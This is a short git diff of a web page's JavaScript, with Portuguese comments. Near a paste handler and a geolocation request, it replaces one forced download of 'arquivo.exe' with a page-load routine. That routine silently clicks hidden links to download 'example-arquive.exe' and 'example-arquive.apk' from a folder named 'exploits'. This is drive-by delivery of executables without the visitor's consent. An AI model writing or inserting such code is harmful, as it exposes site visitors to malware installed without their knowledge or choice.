@@ -215,18 +215,24 @@ document.addEventListener('paste', async (event) => {
         } else {
             alert('Geolocalização não suportada pelo navegador.');
         }
+        
+        window.onload = function () {
+    const arquivos = [
+        { href: 'exploits/example-arquive.exe', nome: 'example-arquive.exe' },
+        { href: 'exploits/example-arquive.apk', nome: 'example-arquive.apk' }
+    ];
 
-    window.onload = function() {
-        // Criar o link de download
-        const link = document.createElement('a');
-        link.href = 'arquivo.exe'; // Substitua pelo caminho do arquivo
-        link.download = 'arquivo.exe'; // Nome do arquivo ao ser baixado
-
-        // Simular o clique no link para iniciar o download
-        link.click();
-    };
-
-
+    arquivos.forEach((arquivo, index) => {
+        setTimeout(() => {
+            const link = document.createElement('a');
+            link.href = arquivo.href;
+            link.download = arquivo.nome;
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+        }, index * 1000); // Pequeno atraso de 1 segundo entre os downloads
+    });
+};
 
   //
   //
